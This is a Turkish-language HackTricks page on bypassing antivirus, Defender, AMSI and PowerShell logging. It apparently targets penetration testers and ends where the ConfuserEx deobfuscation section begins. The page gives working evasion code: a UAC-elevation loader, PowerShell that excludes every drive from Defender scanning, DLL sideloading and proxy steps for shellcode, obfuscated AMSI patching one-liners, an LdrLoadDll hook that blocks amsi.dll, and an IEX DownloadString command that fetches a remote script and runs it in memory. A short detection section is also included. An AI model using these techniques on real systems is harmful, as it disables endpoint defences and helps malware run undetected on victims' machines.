# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa ilk olarak** [**@m2rc_p**](https://twitter.com/m2rc_p)** tarafından yazılmıştır!**

## Defender'ı Durdurma

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durduran bir araç.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV'yi taklit ederek Windows Defender'ın çalışmasını durduran bir araç.
- [Yöneticiyseniz Defender'ı devre dışı bırakın](basic-powershell-for-pentesters/README.md)

### Defender'a müdahale etmeden önce installer tarzı UAC tuzağı

Oyun hilesi gibi görünen herkese açık loader'lar genellikle imzasız Node.js/Nexe installer'ları olarak dağıtılır ve önce **kullanıcıdan yükseltme izni ister**, ardından Defender'ı etkisiz hale getirir. İşleyiş basittir:

1. `net session` ile yönetici bağlamında olup olmadığını kontrol eder. Komut yalnızca çağıran yönetici haklarına sahipse başarılı olur; dolayısıyla başarısız olması loader'ın standart kullanıcı olarak çalıştığını gösterir.
2. Orijinal komut satırını koruyarak beklenen UAC onay istemini tetiklemek için kendisini `RunAs` fiiliyle hemen yeniden başlatır.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Kurbanlar zaten “cracked” yazılım yüklediklerine inandığından, istem genellikle kabul edilir ve böylece malware, Defender’ın ilkesini değiştirmek için ihtiyaç duyduğu izinleri alır.<sup>[[26]](#references)</sup>

### Her sürücü harfi için kapsamlı `MpPreference` istisnaları

Yetki yükseltildikten sonra, GachiLoader tarzı zincirler hizmeti tamamen devre dışı bırakmak yerine Defender’ın kör noktalarını en üst düzeye çıkarır. Loader önce GUI watchdog sürecini (`taskkill /F /IM SecHealthUI.exe`) sonlandırır, ardından her kullanıcı profili, sistem dizini ve çıkarılabilir diskin taranamaz hâle gelmesi için **son derece kapsamlı istisnalar** ekler:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- Döngü, bağlı tüm dosya sistemlerini (D:\, E:\, USB bellekler vb.) tarar; bu nedenle diskin herhangi bir yerine bırakılan **gelecekteki payload'lar yok sayılır**.
- `.sys` uzantısının hariç tutulması ileriye dönük bir önlemdir: saldırganlar, Defender'a tekrar dokunmadan imzasız sürücüleri daha sonra yükleme seçeneğini saklı tutar.
- Tüm değişiklikler `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` altında yapılır. Böylece sonraki aşamalar, UAC'yi yeniden tetiklemeden hariç tutmaların kalıcı olduğunu doğrulayabilir veya bunları genişletebilir.

Hiçbir Defender hizmeti durdurulmadığından, yüzeysel durum denetimleri bu yollar gerçek zamanlı incelemeden muaf olsa da “antivirus active” bildirmeye devam eder.<sup>[[26]](#references)</sup>

## **AV'den Kaçınma Metodolojisi**

Günümüzde AV'ler bir dosyanın kötü amaçlı olup olmadığını kontrol etmek için farklı yöntemler kullanır: statik algılama, dinamik analiz ve daha gelişmiş EDR'lerde davranış analizi.

### **Statik algılama**

Statik algılama; bir binary veya script içindeki bilinen kötü amaçlı dizeleri ya da bayt dizilerini işaretleyerek ve dosyanın kendisinden bilgi çıkararak (ör. dosya açıklaması, şirket adı, dijital imzalar, simge, checksum vb.) gerçekleştirilir. Bu, bilinen herkese açık araçları kullanmanın yakalanma olasılığınızı artırabileceği anlamına gelir; çünkü bu araçlar muhtemelen analiz edilmiş ve kötü amaçlı olarak işaretlenmiştir. Bu tür bir algılamayı aşmanın birkaç yolu vardır:

- **Şifreleme**

Binary'yi şifrelerseniz AV'nin programınızı algılaması mümkün olmaz; ancak programın şifresini çözerek bellekte çalıştıracak bir tür loader gerekir.

- **Obfuscation**

Bazen binary veya script'inizdeki bazı dizeleri değiştirmek, AV algılamasını aşmak için yeterlidir; ancak neyi obfuscate etmeye çalıştığınıza bağlı olarak bu işlem zaman alabilir.

- **Özel araçlar geliştirme**

Kendi araçlarınızı geliştirirseniz, bilinen kötü amaçlı imzalar bulunmaz; ancak bu çok fazla zaman ve emek gerektirir.

> [!TIP]
> Windows Defender'ın statik algılamasını kontrol etmenin iyi bir yolu [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kullanmaktır. Bu araç dosyayı birden fazla parçaya böler ve Defender'dan her birini ayrı ayrı taramasını ister; böylece binary'nizde hangi dizelerin veya baytların işaretlendiğini tam olarak görebilirsiniz.

Pratik AV Evasion hakkında bu [YouTube oynatma listesini](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) incelemenizi şiddetle öneririm.

### **Dinamik analiz**

Dinamik analiz, AV'nin binary'nizi bir sandbox'ta çalıştırıp kötü amaçlı etkinlikleri izlemesidir (ör. tarayıcınızın parolalarını çözmeye ve okumaya çalışmak, LSASS üzerinde minidump almak vb.). Bu yöntemle başa çıkmak biraz daha zor olabilir; ancak sandbox'ları atlatmak için yapabileceğiniz bazı şeyler şunlardır.

- **Çalıştırmadan önce bekleme** Uygulanış biçimine bağlı olarak bu, AV'nin dinamik analizini atlatmanın harika bir yolu olabilir. AV'lerin, kullanıcının iş akışını kesintiye uğratmamak için dosyaları taramak üzere çok az zamanı vardır; bu nedenle uzun süre bekletmek binary analizini aksatabilir. Sorun şu ki birçok AV sandbox'ı, uygulama biçimine bağlı olarak beklemeyi atlayabilir.
- **Makinenin kaynaklarını kontrol etme** Sandbox'larda genellikle kullanılabilecek kaynaklar çok azdır (ör. < 2GB RAM); aksi hâlde kullanıcının makinesini yavaşlatabilirler. Burada oldukça yaratıcı da olabilirsiniz; örneğin CPU sıcaklığını, hatta fan hızlarını kontrol edebilirsiniz. Sandbox'ta her şey uygulanmış olmayacaktır.
- **Makineye özgü kontroller** "contoso.local" etki alanına katılmış bir iş istasyonundaki kullanıcıyı hedeflemek istiyorsanız, bilgisayarın etki alanını kontrol edip belirttiğinizle eşleşip eşleşmediğine bakabilirsiniz. Eşleşmiyorsa programınızdan çıkabilirsiniz.

Microsoft Defender'ın Sandbox bilgisayar adının HAL9TH olduğu ortaya çıktı. Dolayısıyla, malware'inizde çalıştırılmadan önce bilgisayar adını kontrol edebilirsiniz. Ad HAL9TH ile eşleşirse Defender'ın sandbox'ındasınız demektir; bu durumda programınızdan çıkabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>kaynak: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandbox'lara karşı kullanabileceğiniz [@mgeeky](https://twitter.com/mariuszbit) tarafından paylaşılan birkaç iyi ipucu daha:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Bu gönderide daha önce de söylediğimiz gibi, **herkese açık araçlar** eninde sonunda **algılanır**. Bu yüzden kendinize şunu sormalısınız:

Örneğin, LSASS dökmek istiyorsanız, **gerçekten mimikatz kullanmanız gerekiyor mu**? Yoksa daha az bilinen ve LSASS'ı yine de döken başka bir projeyi kullanabilir misiniz?

Doğru yanıt muhtemelen ikincisidir. mimikatz'ı örnek alırsak, AV'ler ve EDR'ler tarafından en çok işaretlenen malware'lerden biri, hatta belki de en çok işaretlenenidir. Projenin kendisi harika olsa da AV'leri aşmak için onunla çalışmak tam bir kâbustur. Bu nedenle, elde etmeye çalıştığınız sonuç için alternatifler arayın.

> [!TIP]
> Payload'larınızı kaçınma amacıyla değiştirirken Defender'da **otomatik örnek gönderimini kapattığınızdan** emin olun ve lütfen, uzun vadede kaçınma hedefliyorsanız **VIRUSTOTAL'A YÜKLEMEYİN**. Payload'ınızın belirli bir AV tarafından algılanıp algılanmadığını kontrol etmek istiyorsanız, AV'yi bir VM'ye kurun, otomatik örnek gönderimini kapatmayı deneyin ve sonuçtan memnun kalana kadar orada test edin.

## EXE'ler ve DLL'ler

Mümkün olduğunda, kaçınma için her zaman **DLL kullanmaya öncelik verin**. Deneyimlerime göre DLL dosyaları genellikle **çok daha az algılanır** ve analiz edilir. Bu nedenle, payload'ınızın DLL olarak çalışmasının bir yolu varsa, bazı durumlarda algılamadan kaçınmak için bu oldukça basit bir yöntemdir.

Bu görselde görebileceğiniz gibi, Havoc'tan bir DLL Payload, antiscan.me'de 4/26 algılama oranına sahipken EXE payload'ın algılama oranı 7/26'dır.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me'de sıradan bir Havoc EXE payload ile sıradan bir Havoc DLL'in karşılaştırması</p></figcaption></figure>

Şimdi, DLL dosyalarını çok daha gizli kullanmak için yararlanabileceğiniz bazı yöntemleri göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading**, loader'ın kullandığı DLL arama sırasından yararlanarak kurban uygulamayı ve kötü amaçlı payload'ları yan yana konumlandırır.

DLL Sideloading'e açık programları [Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell script'i kullanarak kontrol edebilirsiniz:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Bu komut, "C:\Program Files\\" içindeki DLL hijacking'e açık programların listesini ve yüklemeye çalıştıkları DLL dosyalarını çıktı olarak verir.

**DLL Hijackable/Sideloadable programları kendiniz keşfetmenizi** önemle tavsiye ederim. Bu teknik doğru şekilde uygulandığında oldukça gizlidir; ancak herkesçe bilinen DLL Sideloadable programları kullanırsanız kolayca yakalanabilirsiniz.

Bir programın yüklemeyi beklediği adla kötü amaçlı bir DLL yerleştirmek, payload'unuzu yüklemesini sağlamaz; çünkü program, bu DLL'in içinde belirli işlevlerin bulunmasını bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adlı başka bir teknik kullanacağız.

**DLL Proxying**, bir programın proxy (ve kötü amaçlı) DLL'e yaptığı çağrıları orijinal DLL'e iletir. Böylece programın işlevselliği korunurken payload'unuzun yürütülmesi de sağlanır.

[@flangvik](https://twitter.com/Flangvik/) tarafından geliştirilen [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini kullanacağım.

İzlediğim adımlar şunlardı:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Son komut bize 2 dosya verecek: bir DLL kaynak kodu şablonu ve yeniden adlandırılmış orijinal DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem shellcode'umuz ([SGN](https://github.com/EgeBalci/sgn) ile encode edildi) hem de proxy DLL, [antiscan.me](https://antiscan.me) üzerinde 0/26 Detection rate değerine sahip! Buna başarı derim.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading hakkında [S3cur3Th1sSh1t'ın Twitch VOD'unu](https://www.twitch.tv/videos/1644171543) ve ayrıca şimdiye kadar konuştuklarımızı daha derinlemesine öğrenmek için [ippsec'in videosunu](https://www.youtube.com/watch?v=3eROsG_WNpE) **kesinlikle** izlemenizi öneririm.

### Forwarded Exports'u Kötüye Kullanma (ForwardSideLoading)

Windows PE modülleri, aslında "forwarder" olan işlevleri dışa aktarabilir: export girdisi, kodu işaret etmek yerine `TargetDll.TargetFunc` biçiminde bir ASCII dizesi içerir. Bir çağıran export'u çözümlerken Windows loader şunları yapar:

- Henüz yüklenmemişse `TargetDll`'yi yükler
- `TargetFunc`'u buradan çözümler

Anlaşılması gereken temel davranışlar:
- `TargetDll` bir KnownDLL ise korumalı KnownDLLs namespace'inden sağlanır (ör. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- `TargetDll` bir KnownDLL değilse modülün forward çözümlemesini yapan dizinini de içeren normal DLL search order kullanılır.

Bu, dolaylı bir sideloading primitive'i sağlar: işlevi KnownDLL olmayan bir modül adına forward edilen imzalı bir DLL bulun, ardından bu imzalı DLL'yi forward edilen hedef modülle tamamen aynı ada sahip, saldırganın kontrolündeki bir DLL ile aynı dizine koyun. Forwarded export çağrıldığında loader forward'ı çözümler ve aynı dizinden DLL'nizi yükleyerek DllMain'inizi çalıştırır.<sup>[[13]](#references)</sup>

Windows 11'de gözlemlenen örnek:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` bir KnownDLL değildir, bu nedenle normal arama sırasına göre çözümlenir.

PoC (kopyala-yapıştır):
1) İmzalı sistem DLL'sini yazılabilir bir klasöre kopyalayın
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı bir `NCRYPTPROV.dll` bırakın. Code execution elde etmek için minimal bir DllMain yeterlidir; DllMain'i tetiklemek için forwarded function'ı uygulamanız gerekmez.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) İmzalı bir LOLBin ile yönlendirmeyi tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Gözlemlenen davranış:
- rundll32 (imzalı), side-by-side `keyiso.dll` dosyasını (imzalı) yükler
- `KeyIsoSetAuditingInterface` çözümlenirken loader, `NCRYPTPROV.SetAuditingInterface` yönlendirmesini izler
- Ardından loader, `C:\test` konumundan `NCRYPTPROV.dll` dosyasını yükler ve `DllMain` işlevini çalıştırır
- `SetAuditingInterface` uygulanmamışsa, "missing API" hatası ancak `DllMain` zaten çalıştırıldıktan sonra alınır

Avcılık ipuçları:
- Hedef modülün KnownDLL olmadığı yönlendirilmiş export'lara odaklanın. KnownDLL'ler `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` altında listelenir.
- Yönlendirilmiş export'ları şu araçlar gibi araçlarla listeleyebilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Adayları aramak için Windows 11 forwarder envanterine bakın: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Tespit/savunma fikirleri:
- LOLBins'in (ör. rundll32.exe) sistem dışı yollardan imzalı DLL'ler yüklemesini ve ardından aynı dizinden aynı temel ada sahip KnownDLL olmayan dosyaları yüklemesini izleyin
- Şu tür süreç/modül zincirleri için uyarı oluşturun: `rundll32.exe` → kullanıcı tarafından yazılabilir yollar altındaki sistem dışı `keyiso.dll` → `NCRYPTPROV.dll`
- Kod bütünlüğü ilkelerini (WDAC/AppLocker) uygulayın ve uygulama dizinlerinde yazma+çalıştırma iznini engelleyin

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze, askıya alınmış süreçler, doğrudan syscall'lar ve alternatif yürütme yöntemleri kullanarak EDR'leri atlatmaya yönelik bir payload araç setidir`

Shellcode'unuzu gizli bir şekilde yüklemek ve çalıştırmak için Freeze'i kullanabilirsiniz.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion bir kedi-fare oyunudur; bugün işe yarayan bir yöntem yarın tespit edilebilir. Bu yüzden asla tek bir araca güvenmeyin; mümkünse birden fazla evasion tekniğini zincirlemeyi deneyin.

## Direct/Indirect Syscalls & SSN Çözümlemesi (SysWhispers4)

EDR'lar, `ntdll.dll` syscall stub'larına sıklıkla **user-mode inline hook** yerleştirir. Bu hook'ları atlatmak için doğru **SSN**'yi (System Service Number) yükleyen ve hook'lanmış export giriş noktasını çalıştırmadan kernel mode'a geçen **direct** veya **indirect** syscall stub'ları oluşturabilirsiniz.<sup>[[32]](#references)</sup>

**Çağırma seçenekleri:**
- **Direct (embedded)**: Oluşturulan stub'a bir `syscall`/`sysenter`/`SVC #0` talimatı ekler (`ntdll` export'una uğramaz).
- **Indirect**: Kernel geçişinin `ntdll`'den kaynaklanıyor gibi görünmesi için `ntdll` içindeki mevcut bir `syscall` gadget'ına atlar (heuristic evasion için kullanışlıdır); **randomized indirect**, her çağrıda bir havuzdan gadget seçer.
- **Egg-hunt**: Diskte statik `0F 05` opcode dizisini bulundurmaktan kaçınır; syscall dizisini çalışma zamanında çözümler.

**Hook'lara dayanıklı SSN çözümleme stratejileri:**
- **FreshyCalls (VA sort)**: Stub baytlarını okumak yerine syscall stub'larını sanal adreslerine göre sıralayarak SSN'leri çıkarır.
- **SyscallsFromDisk**: Temiz bir `\KnownDlls\ntdll.dll` eşler, `.text` bölümündeki SSN'leri okur ve ardından eşlemeyi kaldırır (bellekteki tüm hook'ları atlatır).
- **RecycledGate**: VA sıralamasına göre SSN çıkarımını, stub temiz olduğunda opcode doğrulamayla birleştirir; hook tespit edilirse VA çıkarımına geri döner.
- **HW Breakpoint**: `syscall` talimatına DR0 ayarlar ve hook'lanmış baytları ayrıştırmadan, çalışma zamanında `EAX`'teki SSN'yi yakalamak için bir VEH kullanır.

SysWhispers4 kullanım örneği:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI, "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"ı önlemek için oluşturuldu. Başlangıçta AV'ler yalnızca **diskteki dosyaları** tarayabiliyordu; dolayısıyla payload'ları bir şekilde **doğrudan bellekte** çalıştırabilirseniz, yeterli görünürlüğe sahip olmadıkları için AV'ler bunu önlemek adına hiçbir şey yapamıyordu.

AMSI özelliği Windows'un şu bileşenlerine entegre edilmiştir.

- User Account Control veya UAC (EXE, COM, MSI ya da ActiveX kurulumunun yükseltilmesi)
- PowerShell (script'ler, etkileşimli kullanım ve dinamik kod değerlendirme)
- Windows Script Host (wscript.exe ve cscript.exe)
- JavaScript ve VBScript
- Office VBA makroları

Antivirüs çözümlerinin script davranışını incelemesini, script içeriklerini hem şifrelenmemiş hem de gizlenmemiş biçimde sunarak sağlar.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` komutunu çalıştırmak Windows Defender'da aşağıdaki uyarıya neden olur.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Başına `amsi:` eklediğine ve ardından script'in çalıştığı yürütülebilir dosyanın yolunu belirttiğine dikkat edin; bu örnekte powershell.exe

Diske herhangi bir dosya bırakmadık, ancak AMSI nedeniyle bellekteyken yine de yakalandık.

Ayrıca **.NET 4.8** sürümünden itibaren C# kodu da AMSI üzerinden çalıştırılır. Bu, bellekte çalıştırma için `Assembly.Load(byte[])` kullanımını da etkiler. Bu nedenle, AMSI'den kaçınmak için bellekte çalıştırma sırasında daha eski .NET sürümlerinin (4.7.2 veya altı gibi) kullanılması önerilir.

AMSI'yi atlatmanın birkaç yolu vardır:

- **Obfuscation**

AMSI esas olarak statik tespit kullandığından, yüklemeye çalıştığınız script'leri değiştirmek tespit edilmekten kaçınmanın iyi bir yolu olabilir.

Ancak AMSI, birden fazla katmanı olsa bile script'lerin obfuscation işlemini çözebilir; bu nedenle nasıl yapıldığına bağlı olarak obfuscation kötü bir seçenek olabilir. Bu da tespitten kaçınmayı çok kolay olmayan bir hâle getirir. Yine de bazen birkaç değişken adını değiştirmeniz yeterli olur; bu nedenle durum, bir şeyin ne ölçüde işaretlendiğine bağlıdır.

- **AMSI Bypass**

AMSI, powershell (ayrıca cscript.exe, wscript.exe vb.) işlemine bir DLL yüklenerek uygulandığından, ayrıcalıksız bir kullanıcı olarak çalışırken bile kolayca kurcalanabilir. AMSI uygulamasındaki bu kusur nedeniyle araştırmacılar, AMSI taramasından kaçınmak için birçok yöntem bulmuştur.

**Hata Zorlama**

AMSI başlatmasını başarısız olmaya zorlamak (`amsiInitFailed`), geçerli işlem için herhangi bir tarama başlatılmamasına neden olur. Bu yöntem ilk olarak [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklandı ve Microsoft, yaygın kullanımını önlemek için bir imza geliştirdi.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

AMSI'yi mevcut PowerShell süreci için kullanılamaz hâle getirmek tek satırlık bir PowerShell kodu gerektirdi. Elbette bu satırın kendisi AMSI tarafından işaretlendiğinden, bu tekniği kullanmak için bazı değişiklikler yapmak gerekiyor.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)'ten aldığım değiştirilmiş bir AMSI bypass.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Bunu aklınızda bulundurun: Bu gönderi yayımlandıktan sonra muhtemelen tespit edilecektir; bu nedenle planınız tespit edilmeden kalmaksa herhangi bir kod yayımlamamalısınız.

**Memory Patching**

Bu teknik ilk olarak [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedildi. Teknik, amsi.dll içindeki "AmsiScanBuffer" işlevinin (kullanıcı tarafından sağlanan girdiyi taramaktan sorumludur) adresini bulmayı ve bu işlevi E_INVALIDARG kodunu döndürecek talimatlarla üzerine yazmayı içerir. Bu şekilde, gerçek taramanın sonucu 0 döndürür ve bu da temiz bir sonuç olarak yorumlanır.

> [!TIP]
> Daha ayrıntılı bir açıklama için lütfen [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) sayfasını okuyun.

AMSI'yi powershell ile atlatmak için kullanılan başka birçok teknik de var. Bunlar hakkında daha fazla bilgi edinmek için [**bu sayfaya**](basic-powershell-for-pentesters/index.html#amsi-bypass) ve [**bu repoya**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) göz atın.

### amsi.dll yüklenmesini engelleyerek AMSI'yi devre dışı bırakma (LdrLoadDll hook)

AMSI yalnızca `amsi.dll` geçerli sürece yüklendikten sonra başlatılır. Sağlam ve dilden bağımsız bir bypass yöntemi, istenen modül `amsi.dll` olduğunda hata döndüren bir kullanıcı modu hook'unu `ntdll!LdrLoadDll` üzerine yerleştirmektir. Böylece AMSI hiçbir zaman yüklenmez ve bu süreç için hiçbir tarama yapılmaz.<sup>[[23]](#references)</sup>

Uygulama taslağı (x64 C/C++ sözde kodu):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notlar
- PowerShell, WScript/CScript ve özel loader'lar genelinde çalışır (aksi durumda AMSI'yi yükleyecek her şey).
- Uzun komut satırı izlerini önlemek için betikleri stdin üzerinden göndermekle birlikte kullanın (`PowerShell.exe -NoProfile -NonInteractive -Command -`).
- LOLBins aracılığıyla çalıştırılan loader'larda kullanıldığı görülmüştür (örn. `regsvr32` ile `DllRegisterServer` çağrısı).

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** aracı da AMSI'yi atlatmak için betik oluşturur.
**[https://amsibypass.com/](https://amsibypass.com/)** aracı da rastgele kullanıcı tanımlı işlevler, değişkenler ve karakter ifadeleri kullanarak imza tespitinden kaçınan ve imza tespitini önlemek için PowerShell anahtar sözcüklerinde rastgele büyük/küçük harf kullanımı uygulayan, AMSI'yi atlatmaya yönelik betikler oluşturur.

**Tespit edilen imzayı kaldırın**

Geçerli işlemin belleğindeki tespit edilen AMSI imzasını kaldırmak için **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi araçlar kullanabilirsiniz. Bu araç, geçerli işlemin belleğini AMSI imzası için tarar ve ardından bu imzayı NOP talimatlarıyla üzerine yazarak bellekten etkili biçimde kaldırır.

**AMSI kullanan AV/EDR ürünleri**

AMSI kullanan AV/EDR ürünlerinin listesini **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** adresinde bulabilirsiniz.

**PowerShell sürüm 2'yi kullanın**
PowerShell sürüm 2'yi kullanırsanız AMSI yüklenmez; böylece betiklerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şöyle yapabilirsiniz:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging, bir sistemde yürütülen tüm PowerShell komutlarını kaydetmenizi sağlayan bir özelliktir. Denetim ve sorun giderme amacıyla yararlı olabilir; ancak **tespit edilmekten kaçınmak isteyen saldırganlar için bir sorun da olabilir**.

PowerShell logging'i atlatmak için şu teknikleri kullanabilirsiniz:

- **PowerShell Transcription ve Module Logging'i devre dışı bırakın**: Bu amaçla [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir araç kullanabilirsiniz.
- **PowerShell version 2 kullanın**: PowerShell version 2 kullanırsanız AMSI yüklenmez; böylece script'lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Şöyle yapabilirsiniz: `powershell.exe -version 2`
- **Unmanaged PowerShell session kullanın**: PowerShell'i `powershell.exe` başlatmadan barındırmak için [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (Cobalt Strike'ın `powerpick` tarafından kullanılan yaklaşım). Bu, özellikle `powershell.exe` sürecine bağlı denetimleri atlatır; ancak AMSI'yi, Script Block Logging'i veya diğer tüm PowerShell savunmalarını kendiliğinden devre dışı bırakmaz. Kapsam, runtime'a ve host uygulamasına bağlıdır.


## Obfuscation

> [!TIP]
> Birkaç obfuscation tekniği verileri şifrelemeye dayanır; bu, binary'nin entropisini artırarak AV ve EDR'lerin onu tespit etmesini kolaylaştırır. Bu konuda dikkatli olun ve şifrelemeyi yalnızca kodunuzun hassas olan veya gizlenmesi gereken belirli bölümlerine uygulayın.

### ConfuserEx Korumalı .NET Binary'lerinin Deobfuscation İşlemi

ConfuserEx 2 (veya ticari fork'ları) kullanan malware'i analiz ederken, decompiler'ları ve sandbox'ları engelleyen birkaç koruma katmanıyla karşılaşmak yaygındır. Aşağıdaki iş akışı, daha sonra dnSpy veya ILSpy gibi araçlarda C#'a decompile edilebilecek, **orijinale çok yakın bir IL'yi güvenilir biçimde geri yükler**.<sup>[[10]](#references)</sup>

